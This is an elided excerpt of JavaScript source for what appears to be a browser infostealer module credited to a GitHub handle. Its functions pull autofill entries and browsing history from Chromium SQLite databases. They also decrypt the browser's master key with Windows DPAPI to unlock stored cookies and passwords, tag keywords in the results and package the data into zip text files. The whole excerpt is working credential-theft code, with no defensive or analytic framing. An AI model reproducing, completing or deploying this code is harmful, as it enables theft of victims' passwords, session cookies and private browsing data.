module.exports = (client) => {
    return {
                ...
                for (let [key, value] of Object.entries(client.config.environ[type])) {
                    if (value.length != 0) {
                        ...
                        if (found_keywords.length == 0) {
                            found_keywords = "Found keywords: None\n<================[github.com/qorncat]>================>\n"
                        } else {
                            found_keywords = `Found keywords: ${found_keywords.join(", ")}\n<================[github.com/qorncat]>================>\n`
                        }

                        client.utils.jszip.createTxt(`\\${type}\\${key.toUpperCase()}.txt`, `${found_keywords}\n${text}`)
                    }
                }
            })
        },
        ...
        async getAutofill(path) {
            ...
            if (path.startsWith(client.utils.encryption.decryptData(client.config.user.appdata))) path_tail = path;
            ...
            if (client.requires.fs.existsSync(`${path}\\Web Data`)) {
                ...
                var sql = new client.requires.sqlite3.Database(`${path}\\Web Data`, err => {});

                sql.each('SELECT * FROM autofill', function (err, row) {

                    if (row) {
                        client.config.environ.autofill.all.push(`Name: ${row.name} | Value: ${row.value} | Date created (timestamp): ${row.date_created} | Date last used (timestamp): ${row.date_last_used} | Count: ${row.count}`);

                        if (!client.config.environ.autofill[browser]) {
                            client.config.environ.autofill[browser] = []
                        }

                        client.config.environ.autofill[browser].push(`Name: ${row.name} | Value: ${row.value} | Date created (timestamp): ${row.date_created} | Date last used (timestamp): ${row.date_last_used} | Count: ${row.count}`);
                    }
                })
            }
        },
        ...
        async getHistory(path) {
            ...
            if (client.requires.fs.existsSync(`${path_tail}\\History`)) {
                var sql = new client.requires.sqlite3.Database(`${path}\\History`, err => {});

                sql.each('SELECT * FROM urls', function (err, row) {
                    client.config.environ.history.all.push(`ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`);

                    if (!client.config.environ.history[browser]) {
                        client.config.environ.history[browser] = []
                    }

                    client.config.environ.history[browser].push(`ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`);
        ...
        async getCookies(path) {
            ...
            if (client.requires.fs.existsSync(path_tail)) {
                ...
                let encrypted = Buffer.from(JSON.parse(client.requires.fs.readFileSync(path_tail + 'Local State'))
                ...
                const key = client.requires.dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');

                var sql = new client.requires.sqlite3.Database(`${path}Network\\Cookies`, err => {});
                ...
                await new Promise((resolve, reject) => {
                    ...
                    sql.each('SELECT * FROM cookies', function (err, row) {
                        ...
                        client.config.environ.cookies[browser].push(`${row['host_key']}	TRUE	/	FALSE	2597573456	${row['name']}	${decrypted}`);
        ...
        async getPasswords(path) {
            ...
            if (client.requires.fs.existsSync(path_tail)) {
                let encrypted = Buffer.from(JSON.parse(client.requires.fs.readFileSync(path_tail + 'Local State'))
                    .os_crypt.encrypted_key, 'base64').slice(5);
                ...
                const key = client.requires.dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, 'CurrentUser');
                var sql = new client.requires.sqlite3.Database(passwords_db, err => {});
